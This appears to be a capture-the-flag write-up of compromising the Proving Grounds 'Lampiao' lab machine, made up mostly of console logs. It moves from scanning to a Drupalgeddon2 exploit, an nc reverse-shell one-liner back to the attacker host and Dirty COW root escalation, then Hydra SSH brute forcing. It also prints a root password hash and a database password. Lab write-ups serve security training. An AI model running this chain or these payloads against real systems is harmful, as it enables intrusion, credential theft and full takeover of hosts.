# Recon

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# nmap -Pn -sT -sV -n 192.168.106.48 -p- --min-rate 1000 --max-retries --reason 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-23 07:26 CST
Warning: 192.168.106.48 giving up on port because retransmission cap hit (0).
Nmap scan report for 192.168.106.48
Host is up (0.11s latency).
Not shown: 53745 closed ports, 11788 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 
....
....
```

## HTTP TCP/80

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# nmap -Pn -sT --script http-enum -n 192.168.106.48 -p 80 --min-rate 1000 --max-retries 2 --reason 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-23 07:35 CST
Nmap scan report for 192.168.106.48
Host is up, received user-set (0.11s latency).

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# nmap -Pn -sT -sV -n 192.168.106.48 -p 22,80,1898  --reason 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-23 07:47 CST
Nmap scan report for 192.168.106.48
Host is up, received user-set (0.12s latency).

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http?   syn-ack
1898/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Lampiao/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# nc 192.168.106.48 80
 _____ _   _                                                      
|_   _| | ( )                                                     
  | | | |_|/ ___    ___  __ _ ___ _   _                           
  | | | __| / __|  / _ \/ _` / __| | | |                          
 _| |_| |_  \__ \ |  __/ (_| \__ \ |_| |_                         
 \___/ \__| |___/  \___|\__,_|___/\__, ( )                        
                                   __/ |/                         
                                  |___/                           
______ _       _                                                _ 
|  ___(_)     | |                                              | |
| |_   _    __| |_   _ _ __ ___   __ _    ___  __ _ _   _  __ _| |
|  _| | |  / _` | | | | '_ ` _ \ / _` |  / _ \/ _` | | | |/ _` | |
| |   | | | (_| | |_| | | | | | | (_| | |  __/ (_| | |_| | (_| |_|
\_|   |_|  \__,_|\__,_|_| |_| |_|\__,_|  \___|\__, |\__,_|\__,_(_)
                                               __/ |              
                                              |___/                 
....
....
```

## HTTP TCP/1898

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Lampiao/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Lampiao/img/3.png)

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# python3 /opt/dirsearch/dirsearch.py -u http://192.168.106.48:1898/ -e php,txt --random-agents --http-method=GET -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-11-23_07-58-14.log

Target: http://192.168.106.48:1898/

[07:58:15] Starting: 
[07:58:46] 200 -  108KB - /CHANGELOG.txt
[07:59:00] 200 -   10KB - /includes/
[07:59:00] 301 -  325B  - /includes  ->  http://192.168.106.48:1898/includes/
[07:59:00] 200 -   11KB - /index.php
[07:59:01] 200 -    2KB - /INSTALL.mysql.txt
[07:59:01] 200 -    2KB - /INSTALL.pgsql.txt
[07:59:01] 200 -    3KB - /install.php
[07:59:01] 200 -   18KB - /INSTALL.txt
[07:59:03] 200 -   18KB - /LICENSE.txt
[07:59:06] 200 -    9KB - /MAINTAINERS.txt
[07:59:07] 301 -  321B  - /misc  ->  http://192.168.106.48:1898/misc/
[07:59:08] 301 -  324B  - /modules  ->  http://192.168.106.48:1898/modules/
[07:59:16] 301 -  325B  - /profiles  ->  http://192.168.106.48:1898/profiles/
[07:59:16] 200 -  743B  - /profiles/standard/standard.info
[07:59:16] 200 -  271B  - /profiles/minimal/minimal.info
[07:59:16] 200 -  278B  - /profiles/testing/testing.info
[07:59:17] 200 -    5KB - /README.txt
[07:59:18] 200 -    2KB - /robots.txt
[07:59:19] 301 -  324B  - /scripts  ->  http://192.168.106.48:1898/scripts/
[07:59:19] 200 -    3KB - /scripts/
[07:59:22] 301 -  322B  - /sites  ->  http://192.168.106.48:1898/sites/
[07:59:27] 301 -  323B  - /themes  ->  http://192.168.106.48:1898/themes/
[07:59:28] 200 -   10KB - /UPGRADE.txt
[07:59:30] 200 -    2KB - /web.config
[07:59:32] 200 -   42B  - /xmlrpc.php

Task Completed

```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Lampiao/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Lampiao/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Lampiao/img/6.png)

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# curl http://192.168.106.48:1898//CHANGELOG.txt  | more
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
- Added menu tree render structure to (pre-)process hooks for theme_menu_tree()
  (API addition: https://www.drupal.org/node/2827134).
- Added new function for determining whether an HTTPS request is being served
  (API addition: https://www.drupal.org/node/2824590).
- Fixed incorrect default value for short and medium date formats on the date
  type configuration page.
- File validation error message is now removed after subsequent upload of valid
  file.
- Numerous bug fixes.
- Numerous API documentation improvements.
- Additional performance improvements.
- Additional automated test coverage.
....
....
```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# wget http://192.168.106.48:1898//profiles/minimal/minimal.info
--2021-11-23 08:05:47--  http://192.168.106.48:1898//profiles/minimal/minimal.info
Conectando con 192.168.106.48:1898... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 271 [application/x-info]
Grabando a: “minimal.info”

minimal.info                        100%[===================================================================>]     271  --.-KB/s    en 0s      

2021-11-23 08:05:47 (37,3 MB/s) - “minimal.info” guardado [271/271]

root@kali:/OSCPv3/offsec_pg/Lampiao# cat minimal.info 
name = Minimal
description = Start with only a few modules enabled.
version = VERSION
core = 7.x
dependencies[] = block
dependencies[] = dblog

; Information added by Drupal.org packaging script on 2017-02-01
version = "7.54"
project = "drupal"
datestamp = "1485986921"

```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# searchsploit Drupal 7
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                           | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                   | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                     | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                   | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                         | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                          | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                               | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                     | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                     | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                        | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                          | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                              | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                         | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                           | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                   | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                               | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                                                                               | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                        | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                     | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                             | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                             | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                         | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                         | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                | php/webapps/44448.py
....
....

```

https://raw.githubusercontent.com/lorddemon/drupalgeddon2/master/drupalgeddon2.py

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# python drupalgeddon2.py -h http://192.168.106.48:1898 -c whoami 
www-data
```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# python drupalgeddon2.py -h http://192.168.106.48:1898 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.106 4242 >/tmp/f"
...
...
```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.49.106] from (UNKNOWN) [192.168.106.48] 44020
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
www-data@lampiao:/var/www/html$ ^Z
[1]+  Detenido                nc -lvnp 4242
root@kali:/OSCPv3/offsec_pg/Lampiao# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Lampiao# nc -lvnp 4242
                                                  reset: unknown terminal type unknown
Terminal type? xterm

www-data@lampiao:/var/www/html$ export TERM=xterm
www-data@lampiao:/var/www/html$ export SHELL=bash
```

```console
www-data@lampiao:/home/tiago$ cat local.txt 
e48eeb08be09897f8a63a24a3a1e67e8
```


# Privilege escalation 1

```console
www-data@lampiao:/home/tiago$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
...
...
```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# nano passwd
root:$6$blDsHpU9$1.jyQg4uduSokEQ9Jgvo.5WkyUW52zP1XPT/PaA54y4y1ozS0WwrYcYUjfLZkBxx85gU2ROt5OpnoR5bDnbJX1:0:0:root:/root:/bin/bash
```

```console
root@kali:/OSCPv3/offsec_pg/Lampiao# john --wordlist=/usr/share/wordlists/rockyou.txt passwd 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
```


```console
www-data@lampiao:/home/tiago$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/ping6
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/mtr
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/sbin/uuidd
```

```console
www-data@lampiao:/tmp$ wget http://192.168.49.106:9000/pspy32s
--2021-11-23 13:15:06--  http://192.168.49.106:9000/pspy32s
Connecting to 192.168.49.106:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: 'pspy32s'

100%[======================================>] 1,156,536    780KB/s   in 1.4s   

2021-11-23 13:15:08 (780 KB/s) - 'pspy32s' saved [1156536/1156536]

www-data@lampiao:/tmp$ chmod +x pspy32s 
```

```console
www-data@lampiao:/tmp$ ./pspy32s
....
....
2021/11/23 13:17:50 CMD: UID=0    PID=8171   | ps aux 
2021/11/23 13:17:50 CMD: UID=0    PID=8170   | /bin/bash /etc/cangaco/lampiao.sh 
2021/11/23 13:17:50 CMD: UID=0    PID=8177   | sleep 10 
2021/11/23 13:17:50 CMD: UID=0    PID=8176   | /bin/bash /etc/cangaco/lampiao.sh 
2021/11/23 13:17:50 CMD: UID=0    PID=8175   | /bin/bash /etc/cangaco/lampiao.sh 
2021/11/23 13:18:00 CMD: UID=0    PID=8183   | awk {print $2} 
2021/11/23 13:18:00 CMD: UID=0    PID=8182   | grep -v grep 
2021/11/23 13:18:00 CMD: UID=0    PID=8181   | grep nc -lk 80 
...
...
```

```console
www-data@lampiao:/tmp$ wget http://192.168.49.106:9000/linpeas.sh
--2021-11-23 13:22:57--  http://192.168.49.106:9000/linpeas.sh
Connecting to 192.168.49.106:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 634071 (619K) [text/x-sh]
Saving to: 'linpeas.sh'

100%[======================================>] 634,071      482KB/s   in 1.3s   

2021-11-23 13:22:58 (482 KB/s) - 'linpeas.sh' saved [634071/634071]

www-data@lampiao:/tmp$ chmod +x linpeas.sh 
```

```console
www-data@lampiao:/tmp$ ./linpeas.sh 
...
...
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDet
ails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|
2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu
=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.
redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
...
...
```

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs


```console
www-data@lampiao:/tmp$ wget http://192.168.49.106:9000/40611.c
--2021-11-23 13:52:11--  http://192.168.49.106:9000/40611.c
Connecting to 192.168.49.106:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2938 (2.9K) [text/plain]
Saving to: '40611.c'

100%[======================================>] 2,938       --.-K/s   in 0.003s  

2021-11-23 13:52:11 (898 KB/s) - '40611.c' saved [2938/2938]

www-data@lampiao:/tmp$ gcc -pthread 40611.c -o 40611   
www-data@lampiao:/tmp$ ./40611 
lampiao:/tmp$ ./40611 /etc/passwd "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash"
mmap b77b8000

...
...
```
Crash


```console
cat sites/default/settings.php  | more
...
...
 */
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'Virgulino',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

/**
...
...
```

```console
www-data@lampiao:/tmp$ wget http://192.168.49.150:9000/cowroot.c
--2021-11-23 15:39:11--  http://192.168.49.150:9000/cowroot.c
Connecting to 192.168.49.150:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4688 (4.6K) [text/plain]
Saving to: 'cowroot.c'

100%[======================================>] 4,688       --.-K/s   in 0.005s  

2021-11-23 15:39:11 (957 KB/s) - 'cowroot.c' saved [4688/4688]
```

```console
www-data@lampiao:/tmp$ gcc cowroot.c -o cowroo -pthread
cowroot.c: In function 'procselfmemThread':
cowroot.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
         lseek(f,map,SEEK_SET);
         ^
In file included from cowroot.c:27:0:
/usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
cowroot.c: In function 'main':
cowroot.c:141:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
```

```console
www-data@lampiao:/tmp$ su tiago
Password: 
tiago@lampiao:/tmp$ id
uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)
```

```console
www-data@lampiao:/tmp$ ./cowroot 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 45420
Racing, this may take a while..
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@lampiao:/tmp# whoami
root
```

```console
www-data@lampiao:/tmp$ ./cowroot 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 45420
Racing, this may take a while..
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@lampiao:/tmp# cd /root
root@lampiao:/root# ls
flag.txt  proof.txt
root@lampiao:/root# cat proof.txt
79c6d62f80a43569f4ec835f20a524e0
```


# Privilege escalation 2

https://github.com/gbonacini/CVE-2016-5195/blob/master/dcow.cpp

https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp

```shell
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
```
```shell
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```


# Explotation 2

```shell
cewl -w cewl.txt http://192.168.49.106:1898/?q=node/1
wc -l cewl.txt
```
```shell
hydra -L usernames.txt -P cewl.txt -o hydra.txt -e nsr -f -t 4 ssh://192.168.49.106
```


References

https://fengweiz.github.io/19fa-cs315/slides/lab9-slides-dirty-cow.pdf

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/linux-unix/privilege-escalation

https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#ftp---21

https://github.com/DominicBreuker/pspy

https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration

https://blog.adithyanak.com/oscp-preparation-guide/linux-privilege-escalation

https://gtfobins.github.io

